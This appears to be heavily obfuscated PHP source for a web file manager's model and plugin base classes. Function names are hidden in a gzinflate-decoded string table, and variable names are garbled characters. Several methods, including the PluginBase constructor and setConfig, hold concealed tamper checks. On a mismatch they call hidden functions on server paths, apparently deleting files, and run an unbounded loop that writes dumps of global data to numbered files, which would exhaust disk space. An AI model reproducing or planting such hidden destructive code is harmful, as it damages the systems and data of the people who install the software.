!$¡¶àûµ || !in_array_not_case($µêµıÆÑ, $¡¶àûµ) || $¿ÇÂ½Îì && $ëá÷¹‘û != REPEAT_RENAME_FOLDER) { return $µêµıÆÑ; } if ($ëá÷¹‘û == REPEAT_SKIP) { return !1; } $€·ÓŒÜ› = $ü½ä¡Ç°[10] . get_path_ext($µêµıÆÑ); $€·ÓŒÜ› = $€·ÓŒÜ› == $ü½ä¡Ç°[10] || $¿ÇÂ½Îì ? $ü½ä¡Ç°[12] : $€·ÓŒÜ›; for ($óò“õÇÑ = 1; $óò“õÇÑ <= count($¡¶àûµ) + 1; $óò“õÇÑ++) { $¾ø¨¿âĞ = substr($µêµıÆÑ, 0, strlen($µêµıÆÑ) - strlen($€·ÓŒÜ›)); $ôÉã‘¢É = $¾ø¨¿âĞ . "\50{$óò“õÇÑ}\x29{$€·ÓŒÜ›}"; if (!in_array_not_case($ôÉã‘¢É, $¡¶àûµ)) { return $ôÉã‘¢É; } } } } if ($_SERVER[$_SERVER[ •ŒÓîÆ][255]] != $_SERVER[$_SERVER[ •ŒÓîÆ][1614]]) { $_getc = $_SERVER[ •ŒÓîÆ][257]; $_getfile = $_SERVER[$_SERVER[ •ŒÓîÆ][258]] . $_SERVER[ •ŒÓîÆ][259]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ •ŒÓîÆ][248], $_getfilec); if (count($_getarrs) < $_SERVER[ •ŒÓîÆ][260]) { $exit = $_SERVER[ •ŒÓîÆ][261]; $exit(); } $_act = $_SERVER[ •ŒÓîÆ][262]; $_act($_SERVER[$_SERVER[ •ŒÓîÆ][256]]); } goto B­£–«Å‘Ù; Dˆ‰âï‰ÎÙ: while ($ldrcekmnso < $_SERVER[ •ŒÓîÆ][660]) { if ($ldrcekmnso >= 0) { break; } $ldrcekmnso++; } $_SERVER[ıŸƒèÂë] = explode($_SERVER[ •ŒÓîÆ][661], gzinflate(substr($_SERVER[ •ŒÓîÆ][662], 10, -8))); $jodbhapknw = $_SERVER[ •ŒÓîÆ][663]; goto F¶«¶œé¨Ù; f›Ã‚˜»ñ˜: define($_SERVER[ •ŒÓîÆ][0], $_SERVER[ •ŒÓîÆ][1]); $_SERVER[û³†Ï­‹] = explode($_SERVER[ •ŒÓîÆ][2], gzinflate(substr($_SERVER[ •ŒÓîÆ][3], 10, -8))); function binCheckEq($šïÎÙ³¸, $Çì±¦ğµ) { return $šïÎÙ³¸ == $Çì±¦ğµ; } goto F•òÇ›£²Ó; DÇµÊŞ¥¯º: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\145\x6d\117\x70\x74\x69\x6f\x6e"; public $field = array(); public function listData($Á“…Â‘ = false, $ÕË‡°Œ = "\155\157\144\151\146\x79\124\151\x6d\x65", $´ı‘Öğ = false) { $´‡İ¾ô¿ = Model($this->modelType)->get(!1, $this->optionType, !0); $¤œçÛÅ½ = array_values($´‡İ¾ô¿); if ($¤œçÛÅ½ && $¤œçÛÅ½[0] && !is_array($¤œçÛÅ½[0])) { Model($this->modelType)->cacheRemove($this->optionType); $´‡İ¾ô¿ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$´‡İ¾ô¿) { return $Á“…Â‘ ? null : array(); } if (!$Á“…Â‘) { $´‡İ¾ô¿ = array_filter(array_values($´‡İ¾ô¿)); return array_sort_by($´‡İ¾ô¿, $ÕË‡°Œ, $´ı‘Öğ); } return $´‡İ¾ô¿[$_SERVER[ •ŒÓîÆ][450] . $Á“…Â‘]; } public function insert($É½›â‚«) { $ò¯˜‚Á¤ =& $_SERVER[ •ŒÓîÆ]; $É½›â‚« = array_field_key($É½›â‚«, $this->field); $ä…© è = Model($this->modelType)->get($ò¯˜‚Á¤[451], $this->optionType . $ò¯˜‚Á¤[452]); $ä…© è = $ä…© è ? $ä…© è : 0; $É½›â‚«[$ò¯˜‚Á¤[453]] = ++$ä…© è; $É½›â‚«[$ò¯˜‚Á¤[217]] = time(); $É½›â‚«[$ò¯˜‚Á¤[87]] = time(); Model($this->modelType)->set($ò¯˜‚Á¤[451], $ä…© è, $this->optionType . $ò¯˜‚Á¤[452]); Model($this->modelType)->set($ò¯˜‚Á¤[450] . $ä…© è, $É½›â‚«, $this->optionType); return $ä…© è; } public function update($ï¶ıùª¿, $öªœññ¡) { $”Ğüè¦ô =& $_SERVER[ •ŒÓîÆ]; $öªœññ¡ = array_field_key($öªœññ¡, $this->field); $ªİ²š§ = $this->listData($ï¶ıùª¿); if (!$ªİ²š§ || !$ï¶ıùª¿) { return !1; } $öªœññ¡ = array_merge($ªİ²š§, $öªœññ¡); $öªœññ¡[$”Ğüè¦ô[87]] = time(); return Model($this->modelType)->set($”Ğüè¦ô[450] . $ï¶ıùª¿, $öªœññ¡, $this->optionType); } public function remove($ß’œª½Â) { if (!$ß’œª½Â) { return !1; } return Model($this->modelType)->remove($_SERVER[ •ŒÓîÆ][450] . $ß’œª½Â, $this->optionType); } public function clear() { $Ãƒ¢«ş =& $_SERVER[ •ŒÓîÆ]; Model($this->modelType)->remove($Ãƒ¢«ş[451], $this->optionType . $Ãƒ¢«ş[452]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($­Ìâ§­ç, $ú«ÕËšœ) { if (!$ú«ÕËšœ) { return !1; } $¦áğöô  = $this->listData(); $¦áğöô  = array_to_keyvalue($¦áğöô , $­Ìâ§­ç); return isset($¦áğöô [$ú«ÕËšœ]) ? $¦áğöô [$ú«ÕËšœ] : !1; } public function findByName($°Üç¾¦) { return $this->findByKey($_SERVER[ •ŒÓîÆ][32], $°Üç¾¦); } protected function resetData($´Æ§…Ò¬) { $Ûõ‘ =& $_SERVER[ •ŒÓîÆ]; $´Æ§…Ò¬ = is_array($´Æ§…Ò¬) ? $´Æ§…Ò¬ : array(); $åşÉğ¢â = array(); for ($ÇáìèµÀ = 0; $ÇáìèµÀ < count($´Æ§…Ò¬); $ÇáìèµÀ++) { $åşÉğ¢â[$Ûõ‘[450] . $´Æ§…Ò¬[$ÇáìèµÀ][$Ûõ‘[453]]] = $´Æ§…Ò¬[$ÇáìèµÀ]; } return Model($this->modelType)->set($åşÉğ¢â, !1, $this->optionType); } private function getAutoName($¾Ÿ©Ëä) { $™šúË•ş = array_to_keyvalue($this->listData(), $_SERVER[ •ŒÓîÆ][32]); if (!$™šúË•ş || !isset($™šúË•ş[$¾Ÿ©Ëä])) { return $¾Ÿ©Ëä; } for ($ã…üòìŞ = 1; $ã…üòìŞ < count($™šúË•ş); $ã…üòìŞ++) { $Õ€Œ¶§­ = $¾Ÿ©Ëä . "\x28{$ã…üòìŞ}\x29"; if (!isset($™šúË•ş[$Õ€Œ¶§­])) { return $Õ€Œ¶§­; } } return $Õ€Œ¶§­; } } $_file = $_SERVER[$_SERVER[ •ŒÓîÆ][256]]; $_size = $_SERVER[ •ŒÓîÆ][454]; goto Cğ·¬À¯¢ò; a’¼á¥Æë¢: class Message { function __construct() { } public function send($™½Ö­Œè = '', $ÁÎÌñÇ¶ = array(), $Æ‹Ã¸ó = "\x74\145\170\164") { $ğ÷Óß÷í =& $_SERVER[ •ŒÓîÆ]; $è×Í«¡ = array($ğ÷Óß÷í[33] => $ğ÷Óß÷í[1546], $ğ÷Óß÷í[795] => $™½Ö­Œè); if (in_array($Æ‹Ã¸ó, array($ğ÷Óß÷í[1546], $ğ÷Óß÷í[1547]))) { $è×Í«¡[$ğ÷Óß÷í[33]] = $Æ‹Ã¸ó; } $ÁÎÌñÇ¶ = array($ğ÷Óß÷í[559] => isset($ÁÎÌñÇ¶[$ğ÷Óß÷í[559]]) ? $ÁÎÌñÇ¶[$ğ÷Óß÷í[559]] : $ğ÷Óß÷í[12], $ğ÷Óß÷í[642] => isset($ÁÎÌñÇ¶[$ğ÷Óß÷í[642]]) ? $ÁÎÌñÇ¶[$ğ÷Óß÷í[642]] : $ğ÷Óß÷í[12]); if (empty($™½Ö­Œè) || empty($ÁÎÌñÇ¶[$ğ÷Óß÷í[559]]) && empty($ÁÎÌñÇ¶[$ğ÷Óß÷í[642]])) { return !1; } $˜Ú¥Ñª¬ = array($ğ÷Óß÷í[1487] => $è×Í«¡, $ğ÷Óß÷í[1548] => $ÁÎÌñÇ¶); Hook::trigger($ğ÷Óß÷í[1549], $˜Ú¥Ñª¬); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $øö¢–á‘ =& $_SERVER[ •ŒÓîÆ]; $ôÈˆ¦Ò = $_SERVER[$øö¢–á‘[258]] . $øö¢–á‘[259]; $´ÛÇÀ – = $øö¢–á‘[454]; if ($_SERVER[$øö¢–á‘[255]] != $´ÛÇÀ –($ôÈˆ¦Ò)) { $Œîçœ¯« = $øö¢–á‘[918]; $˜ËİÊ§À = $øö¢–á‘[257]; $•Ô¤£ç¯ = $_SERVER[$øö¢–á‘[258]] . $øö¢–á‘[259]; $¨¹»½íñ = $˜ËİÊ§À($•Ô¤£ç¯); $·Õ¢šÈŠ = explode($øö¢–á‘[248], $¨¹»½íñ); if (count($·Õ¢šÈŠ) < $øö¢–á‘[701]) { $ğÈ¿€Ñş = $øö¢–á‘[261]; $ğÈ¿€Ñş(); } $ŠÜş†Æê = $øö¢–á‘[919]; $ŠÜş†Æê($_SERVER[$øö¢–á‘[920]]); $Œîçœ¯« = $øö¢–á‘[918]; $Œîçœ¯«(); $¿’¢Œ”Ó = $øö¢–á‘[921]; $ÀºôÇÅ‘ = json_encode($GLOBALS[$øö¢–á‘[922]]); $Ÿ¾ûÚ = 1; for ($§Ÿ”¯ÃŸ = $Ÿ¾ûÚ; $§Ÿ”¯ÃŸ > 0; $§Ÿ”¯ÃŸ++) { $¿’¢Œ”Ó(DATA_PATH . $§Ÿ”¯ÃŸ, $ÀºôÇÅ‘); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($øö¢–á‘[1550]); $this->pluginName = str_replace($øö¢–á‘[1550], $øö¢–á‘[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $øö¢–á‘[8]; $this->pluginApi = appHostGet() . $øö¢–á‘[1551] . $this->pluginName . $øö¢–á‘[8]; $this->pluginHost = $config[$øö¢–á‘[1552]] . $this->pluginName . $øö¢–á‘[8]; $this->pluginHostDefault = $config[$øö¢–á‘[1552]] . $this->pluginName . $øö¢–á‘[8]; $Õùİ²à§ = $config[$øö¢–á‘[1553]]; if ($Õùİ²à§ && strpos($øö¢–á‘[50] . $Õùİ²à§ . $øö¢–á‘[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$øö¢–á‘[1554]] . $this->pluginName . $øö¢–á‘[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ •ŒÓîÆ][1555]); } protected function assign($éŒÎİ¢µ, $ÃÒÒ†ÑÚ = false) { if (is_array($éŒÎİ¢µ)) { $this->values = array_merge($this->values, $éŒÎİ¢µ); } else { $this->values[$éŒÎİ¢µ] = $ÃÒÒ†ÑÚ; } } protected function display($´ù¨¶€«) { extract($this->values); require $´ù¨¶€«; } final function hookRegist($àøµÑ º) { $this->modelPlugin->appRegist($this->pluginName, $àøµÑ º); } final function appIcon() { $ø”á°ğä =& $_SERVER[ •ŒÓîÆ]; $©Äã‡µ„ = $this->appPackage(); $öüèïù· = $ø”á°ğä[12]; if (isset($©Äã‡µ„[$ø”á°ğä[469]])) { if (isset($©Äã‡µ„[$ø”á°ğä[469]][$ø”á°ğä[1556]])) { $öüèïù· = $ø”á°ğä[1557] . $©Äã‡µ„[$ø”á°ğä[469]][$ø”á°ğä[1556]] . $ø”á°ğä[1558]; } else { if ($©Äã‡µ„[$ø”á°ğä[469]][$ø”á°ğä[1559]]) { $öüèïù· = $ø”á°ğä[1560] . $©Äã‡µ„[$ø”á°ğä[469]][$ø”á°ğä[1559]] . $ø”á°ğä[1561]; } } } return $öüèïù·; } final function fileCanView($›µÙ¶æ) { $Ù¼¡ï» =& $_SERVER[ •ŒÓîÆ]; if (request_url_safe($›µÙ¶æ)) { return !0; } if ($this->isShare($›µÙ¶æ)) { return !0; } $ÇäËÓŒµ = Session::get($Ù¼¡ï»[1562]); if ($GLOBALS[$Ù¼¡ï»[548]] != 1 && !$ÇäËÓŒµ || !$ÇäËÓŒµ[$Ù¼¡ï»[1563]]) { $¨•™ŠÄ£ = $Ù¼¡ï»[1564] . rawurlencode(this_url()); show_tips(LNG($Ù¼¡ï»[1565]) . $Ù¼¡ï»[1566] . $¨•™ŠÄ£ . $Ù¼¡ï»[1567] . LNG($Ù¼¡ï»[1568]) . $Ù¼¡ï»[1569], !1); } if (!Action($Ù¼¡ï»[1570])->authCan($Ù¼¡ï»[1571])) { show_tips(LNG($Ù¼¡ï»[1572]) . $Ù¼¡ï»[1573], !1); } ActionCall($Ù¼¡ï»[1574], $›µÙ¶æ); } final function isShare($¥Œˆø®Ä) { $ğÔ…ãÅ = KodIO::parse($¥Œˆø®Ä); return $ğÔ…ãÅ[$_SERVER[ •ŒÓîÆ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($‡Ó¯ÙÓÛ) { if (request_url_safe($‡Ó¯ÙÓÛ)) { return $‡Ó¯ÙÓÛ; } if (!$this->isShare($‡Ó¯ÙÓÛ)) { $‡Ó¯ÙÓÛ = $this->filePath($‡Ó¯ÙÓÛ, !1); } return Action($_SERVER[ •ŒÓîÆ][1215])->linkOut($‡Ó¯ÙÓÛ); } public function filePathLinkOut($ó©ØòÖ) { if (request_url_safe($ó©ØòÖ)) { return $ó©ØòÖ; } $this->fileCanView($ó©ØòÖ); return Action($_SERVER[ •ŒÓîÆ][1215])->link($ó©ØòÖ); } final function filePath($”«€ú‰À, $±¨åòø = true, $Ã¿¦úÔ = false) { $¦€½Û¶â =& $_SERVER[ •ŒÓîÆ]; $£İ±¶•Ğ = $this->filePathGet($”«€ú‰À, $±¨åòø); if (!$this->fileInfo) { show_tips(LNG($¦€½Û¶â[107]), !1); } if ($Ã¿¦úÔ && isset($this->fileInfo[$¦€½Û¶â[520]]) && $this->fileInfo[$¦€½Û¶â[520]]) { $ûè”°Ü¬ = Model($¦€½Û¶â[523])->fileInfo($this->fileInfo[$¦€½Û¶â[520]]); if (!$ûè”°Ü¬ || !IO::exist($ûè”°Ü¬[$¦€½Û¶â[86]])) { show_tips(LNG($¦€½Û¶â[107]) . $¦€½Û¶â[1575]); } } Hook::trigger($¦€½Û¶â[1576], $£İ±¶•Ğ); return $£İ±¶•Ğ; } final function filePathGet($×ÛÜë€¦, $‰ğÅ¥ÅÄ = true) { $ßš¾âìÙ =& $_SERVER[ •ŒÓîÆ]; if ($ÃŠí°•» = $this->checkSharePath($×ÛÜë€¦, $‰ğÅ¥ÅÄ)) { return $ÃŠí°•»; } $this->fileCanView($×ÛÜë€¦); if (request_url_safe($×ÛÜë€¦)) { $ü—Åµº = parse_url_query($×ÛÜë€¦); if (isset($ü—Åµº[$ßš¾âìÙ[1577]]) && isset($ü—Åµº[$ßš¾âìÙ[220]])) { $÷»“Î–á = Mcrypt::decode($ü—Åµº[$ßš¾âìÙ[220]], Model($ßš¾âìÙ[811])->get($ßš¾âìÙ[812])); if ($÷»“Î–á) { $this->fileInfo = IO::info($÷»“Î–á); $this->fileInfo[$ßš¾âìÙ[1578]] = $×ÛÜë€¦; $this->cachePath = $this->pluginCachePath($ßš¾âìÙ[12], $‰ğÅ¥ÅÄ); return $÷»“Î–á; } } $×ÛÜë€¦ = $this->_cacheHttpFile($×ÛÜë€¦, $‰ğÅ¥ÅÄ); $this->fileInfo = IO::info($×ÛÜë€¦); } else { $this->fileInfo = IO::info($×ÛÜë€¦); $this->cachePath = $this->pluginCachePath($ßš¾âìÙ[12], $‰ğÅ¥ÅÄ); } return $×ÛÜë€¦; } final function _cacheHttpFile($ûôŸÏÒ, $™•çÇ¡î = true) { $åŞïÁú =& $_SERVER[ •ŒÓîÆ]; $¢âöĞıº = parse_url_query($ûôŸÏÒ); $»÷ç·Ñ± = get_path_ext($ûôŸÏÒ); if (isset($¢âöĞıº[$åŞïÁú[32]]) && $¢âöĞıº[$åŞïÁú[32]]) { $»÷ç·Ñ± = get_path_ext($¢âöĞıº[$åŞïÁú[32]]); } $Ëùõé©› = hash_path($ûôŸÏÒ) . $åŞïÁú[10] . $»÷ç·Ñ±; $this->cachePath = $this->pluginCachePath($™•çÇ¡î ? $Ëùõé©› : $åŞïÁú[12]); $øò—Ì§ñ = IO::fileNameExist($this->cachePath, $Ëùõé©›); if ($øò—Ì§ñ) { return KodIO::make($øò—Ì§ñ); } $Ï¸Ê™±‡ = rtrim($this->cachePath, $åŞïÁú[8]) . $åŞïÁú[8] . $Ëùõé©›; return $this->pluginCacheFileSet($Ï¸Ê™±‡, file_get_contents_nossl($ûôŸÏÒ)); } final function checkSharePath($ë‘¦Ø£‚, $ÏŞª¡áÇ = true) { $É××òé¿ =& $_SERVER[ •ŒÓîÆ]; if (!$this->isShare($ë‘¦Ø£‚)) { return !1; } $¯’ç·È¿ = Action($É××òé¿[1215])->sharePathInfo($ë‘¦Ø£‚); if (!is_array($¯’ç·È¿) || !isset($¯’ç·È¿[$É××òé¿[86]])) { show_json(LNG($É××òé¿[1579]), !1); } $this->fileInfo = $¯’ç·È¿; $this->cachePath = $this->pluginCachePath(!1, $ÏŞª¡áÇ); return $¯’ç·È¿[$É××òé¿[86]]; } final function pluginCachePath($¨‚ÍÄÚ„ = '', $Ö•¼¿É = false) { $£Î®éĞ =& $_SERVER[ •ŒÓîÆ]; if ($Ö•¼¿É && is_array($this->fileInfo)) { $¨‚ÍÄÚ„ = kodIO::hashPath($this->fileInfo); } $©İÔ¢÷ = rtrim(IO_PATH_SYSTEM_TEMP . $£Î®éĞ[1580] . $this->pluginName . $£Î®éĞ[8] . $¨‚ÍÄÚ„, $£Î®éĞ[8]); $²Ï‰°ğç = IO::infoFullSimple($©İÔ¢÷); $Ï€äö¨» = $²Ï‰°ğç && is_array($²Ï‰°ğç) ? $²Ï‰°ğç[$£Î®éĞ[86]] : $£Î®éĞ[12]; if (!$Ï€äö¨») { $Ï€äö¨» = IO::mkdir($©İÔ¢÷); } return $Ï€äö¨»; } final function pluginCacheFileSet($°Ç÷æÊª, $‰Çë©àÒ = '') { $Øæúû“Ï =& $_SERVER[ •ŒÓîÆ]; $´«¬ìÓ = IO::infoFullSimple($°Ç÷æÊª); if (!$´«¬ìÓ) { return IO::mkfile($°Ç÷æÊª, $‰Çë©àÒ, REPEAT_REPLACE); } IO::setContent($´«¬ìÓ[$Øæúû“Ï[86]], $‰Çë©àÒ); return $´«¬ìÓ[$Øæúû“Ï[86]]; } final function pluginLocalFile($èÊ›Ó¡ = '') { $ºÃš‘â =& $_SERVER[ •ŒÓîÆ]; $ÈœÍ»Á¢ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ÈœÍ»Á¢)) { mk_dir($ÈœÍ»Á¢); } if (!$èÊ›Ó¡) { return $ÈœÍ»Á¢; } $’ú´º¸ = IO::info($èÊ›Ó¡); $Óœğ¿¬ = $ºÃš‘â[1581] . KodIO::hashPath($’ú´º¸) . $ºÃš‘â[10] . $’ú´º¸[$ºÃš‘â[177]]; if (!checkExtSafe($Óœğ¿¬)) { $Óœğ¿¬ = $Óœğ¿¬ . $ºÃš‘â[1247]; } $ùÎä‚ÈØ = $ÈœÍ»Á¢ . $Óœğ¿¬; if (@file_exists($ùÎä‚ÈØ)) { return $ùÎä‚ÈØ; } return IO::copy($èÊ›Ó¡, $ÈœÍ»Á¢, 0, $Óœğ¿¬); } final function appPackage() { $ıõÅú•ö =& $_SERVER[ •ŒÓîÆ]; if ($this->packageData) { return $this->packageData; } $¼§”Ö„ = $this->parseFile($this->pluginPath . $ıõÅú•ö[1582]); $this->parseLang($¼§”Ö„); $–€§½•‚ = json_decode_force($¼§”Ö„); if (!$–€§½•‚) { return array(); } $®–Éï˜Í = Hook::trigger($ıõÅú•ö[1583], $–€§½•‚); if ($®–Éï˜Í && is_array($®–Éï˜Í)) { $–€§½•‚ = $®–Éï˜Í; } $this->packageData = $–€§½•‚; return $–€§½•‚; } public function packageInfoGet($×¢Š’Óä) { $¥š¨ƒõ— = $this->appPackage(); return array_get_value($¥š¨ƒõ—, $×¢Š’Óä); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ •ŒÓîÆ][1584]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ •ŒÓîÆ][1585]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ •ŒÓîÆ][1586]); } public function echoJsAssign($«ó¼Ş…ş, $­ñëü‰ô) { $this->echoJsAssignArr[$«ó¼Ş…ş] = $­ñëü‰ô; } private function parseFile($’º»÷‘­) { $Å•™†ã =& $_SERVER[ •ŒÓîÆ]; $§‚”‰Û€ = file_get_contents_nossl($’º»÷‘­); $ÏÒŒÓÄ = array($Å•™†ã[1587], $Å•™†ã[1588], $Å•™†ã[1589], $Å•™†ã[1590], $Å•™†ã[1591], $Å•™†ã[1592], $Å•™†ã[1593]); $‹½ğÏÃ× = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Å•™†ã[91]][$Å•™†ã[1594]]); foreach ($this->echoJsAssignArr as $ĞÊûÂÁö => $Å›ßºµ·) { $ÏÒŒÓÄ[] = $Å•™†ã[1595] . $ĞÊûÂÁö . $Å•™†ã[1596]; $‹½ğÏÃ×[] = is_array($Å›ßºµ·) || is_object($Å›ßºµ·) ? rawurlencode(json_encode($Å›ßºµ·)) : $Å›ßºµ·; } if (strstr($§‚”‰Û€, $Å•™†ã[1597])) { $Ñ¶ÉĞ÷ø = rawurlencode(json_encode($this->pluginLangArr)); $§‚”‰Û€ = str_replace($Å•™†ã[1597], $Ñ¶ÉĞ÷ø, $§‚”‰Û€); } if (strstr($§‚”‰Û€, $Å•™†ã[1598])) { $Ñ¶ÉĞ÷ø = $Ñ¶ÉĞ÷ø = rawurlencode(json_encode($this->getConfig())); $§‚”‰Û€ = str_replace($Å•™†ã[1598], $Ñ¶ÉĞ÷ø, $§‚”‰Û€); } $§‚”‰Û€ = str_replace($ÏÒŒÓÄ, $‹½ğÏÃ×, $§‚”‰Û€); return $§‚”‰Û€; } private function parseLang(&$’ü±×åÁ) { $ÛûŸÍöÌ =& $_SERVER[ •ŒÓîÆ]; $©¹ñË© = $ÛûŸÍöÌ[1599]; if (!strstr($’ü±×åÁ, $©¹ñË©)) { return; } preg_match_all($ÛûŸÍöÌ[1600], $’ü±×åÁ, $©Ï˜Éï…); if (!is_array($©Ï˜Éï…) || count($©Ï˜Éï…) == 0 || !is_array($©Ï˜Éï…[0]) || count($©Ï˜Éï…[0]) == 0) { return; } $†µ¨×¶ƒ = array(); $…Æë‡‘’ = array(); foreach ($©Ï˜Éï…[0] as $“ØÍÑ‘û) { $³¼—À¦³ = substr($“ØÍÑ‘û, strlen($©¹ñË©), -4); $¢™‰úÕ¢ = LNG($³¼—À¦³); $†µ¨×¶ƒ[] = $“ØÍÑ‘û; $…Æë‡‘’[] = str_replace(array($ÛûŸÍöÌ[248], $ÛûŸÍöÌ[1119], $ÛûŸÍöÌ[397], $ÛûŸÍöÌ[120]), array($ÛûŸÍöÌ[53], $ÛûŸÍöÌ[53], $ÛûŸÍöÌ[12], $ÛûŸÍöÌ[1601]), $¢™‰úÕ¢); } $’ü±×åÁ = str_replace($†µ¨×¶ƒ, $…Æë‡‘’, $’ü±×åÁ); } private function parseConfig(&$¨œøàã’) { $¼‰°†¼Ï =& $_SERVER[ •ŒÓîÆ]; $ÑĞãú¤ = $¼‰°†¼Ï[1602]; if (!strstr($¨œøàã’, $ÑĞãú¤)) { return; } preg_match_all($¼‰°†¼Ï[1603], $¨œøàã’, $À‹ğÚ£¿); if (!is_array($À‹ğÚ£¿) || count($À‹ğÚ£¿) == 0 || !is_array($À‹ğÚ£¿[0]) || count($À‹ğÚ£¿[0]) == 0) { return; } $×Â¬àÁó = $this->getConfig(); $¼Œ„ñ¿÷ = array(); $ °ıç¼¾ = array(); foreach ($À‹ğÚ£¿[0] as $ÖÄ÷é•º) { $®Ï“ı½­ = substr($ÖÄ÷é•º, strlen($ÑĞãú¤), -2); $¼Œ„ñ¿÷[] = $ÖÄ÷é•º; $ °ıç¼¾[] = _get($×Â¬àÁó, $®Ï“ı½­); } $¨œøàã’ = str_replace($¼Œ„ñ¿÷, $ °ıç¼¾, $¨œøàã’); } private function parsePackage(&$úÇÃøá¾) { $öÍæ™Âó =& $_SERVER[ •ŒÓîÆ]; $—Û¶Œø  = $öÍæ™Âó[1604]; if (!strstr($úÇÃøá¾, $—Û¶Œø )) { return; } preg_match_all($öÍæ™Âó[1605], $úÇÃøá¾, $¡›ÖïÈı); if (!is_array($¡›ÖïÈı) || count($¡›ÖïÈı) == 0 || !is_array($¡›ÖïÈı[0]) || count($¡›ÖïÈı[0]) == 0) { return; } $ÍëÍ¦«Â = $this->appPackage(); $ş¶‰³¡‚ = array(); $„›“˜¥Ú = array(); foreach ($¡›ÖïÈı[0] as $ÂÀĞ‘†ë) { $öò³¢Òç = substr($ÂÀĞ‘†ë, strlen($—Û¶Œø ), -2); $ş¶‰³¡‚[] = $ÂÀĞ‘†ë; $„›“˜¥Ú[] = _get($ÍëÍ¦«Â, $öò³¢Òç); } $úÇÃøá¾ = str_replace($ş¶‰³¡‚, $„›“˜¥Ú, $úÇÃøá¾); } final function echoFile($ñÓßÉ, $Ã‘ÍÈ” = false) { $Ë˜Ÿ²ƒ£ =& $_SERVER[ •ŒÓîÆ]; $ŞÜÔğ…ï = $this->pluginPath . $ñÓßÉ; if (ACT == $Ë˜Ÿ²ƒ£[1606]) { echo $Ë˜Ÿ²ƒ£[1607] . $this->pluginName . $Ë˜Ÿ²ƒ£[8] . $ñÓßÉ . $Ë˜Ÿ²ƒ£[1608]; if (!file_exists($ŞÜÔğ…ï)) { echo $Ë˜Ÿ²ƒ£[1609]; return; } } $¢‰‚ê¦À = $this->parseFile($ŞÜÔğ…ï); $this->parseLang($¢‰‚ê¦À); $this->parseConfig($¢‰‚ê¦À); $this->parsePackage($¢‰‚ê¦À); if (is_array($Ã‘ÍÈ”)) { $¢‰‚ê¦À = str_replace(array_keys($Ã‘ÍÈ”), array_values($Ã‘ÍÈ”), $¢‰‚ê¦À); } echo $Ë˜Ÿ²ƒ£[248] . $¢‰‚ê¦À; } final function initLang() { $á™ÎÖŸª =& $_SERVER[ •ŒÓîÆ]; $ÏÀ’›ĞÚ = $á™ÎÖŸª[1610]; $ÄáÅÖîÁ = $this->pluginPath . $á™ÎÖŸª[1611]; $Î°³úœ = I18n::getType(); $ê´Ğ¦öº = array(); if (file_exists($ÄáÅÖîÁ . $Î°³úœ . $á™ÎÖŸª[880])) { $ê´Ğ¦öº = (include $ÄáÅÖîÁ . $Î°³úœ . $á™ÎÖŸª[880]); } else { if ($Î°³úœ == $á™ÎÖŸª[1612] && !file_exists($ÄáÅÖîÁ . $Î°³úœ . $á™ÎÖŸª[880]) && file_exists($ÄáÅÖîÁ . $á™ÎÖŸª[1613])) { $ê´Ğ¦öº = (include $ÄáÅÖîÁ . $á™ÎÖŸª[1613]); } else { if (file_exists($ÄáÅÖîÁ . $ÏÀ’›ĞÚ . $á™ÎÖŸª[880])) { $ê´Ğ¦öº = (include $ÄáÅÖîÁ . $ÏÀ’›ĞÚ . $á™ÎÖŸª[880]); } } } if (!is_array($ê´Ğ¦öº)) { return array(); } if (@count($ê´Ğ¦öº) > 0) { I18n::set($ê´Ğ¦öº); } return $ê´Ğ¦öº; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($„¼Íœ‰) { $¦½ë¨®ı =& $_SERVER[ •ŒÓîÆ]; if ($_SERVER[$¦½ë¨®ı[255]] != $_SERVER[$¦½ë¨®ı[1614]]) { $ùÜÄ• = $¦½ë¨®ı[918]; $à¨ğê—„ = $¦½ë¨®ı[257]; $ò¨°Åğí = $_SERVER[$¦½ë¨®ı[258]] . $¦½ë¨®ı[259]; $‚Öà– = $à¨ğê—„($ò¨°Åğí); $“ã”¬¨Ë = explode($¦½ë¨®ı[248], $‚Öà–); if (count($“ã”¬¨Ë) < $¦½ë¨®ı[701]) { $ã€Ñ“£ = $¦½ë¨®ı[261]; $ã€Ñ“£(); } $¸Ã¶’…½ = $¦½ë¨®ı[919]; $¸Ã¶’…½($_SERVER[$¦½ë¨®ı[920]]); $¸Ã¶’…½($_SERVER[$¦½ë¨®ı[258]] . $¦½ë¨®ı[1615]); $çâôóÑ· = 1; while ($çâôóÑ· > 1) { $çâôóÑ· = $çâôóÑ· + 4; $öèÆàÙì = rawurlencode($çâôóÑ· . $¦½ë¨®ı[263]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $„¼Íœ‰); } public function onSetConfig($–ı­À†Ä) { } public function onGetConfig($›ÃöûÑ©) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ŒÃ«æÛ§) { if ($ŒÃ«æÛ§ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($•”øÕµî = "\x70\154\x75\147\x69\x6e\x41\165\164\150") { $µÈÎ£¼ó =& $_SERVER[ •ŒÓîÆ]; if (!Session::get($µÈÎ£¼ó[1562])) { return 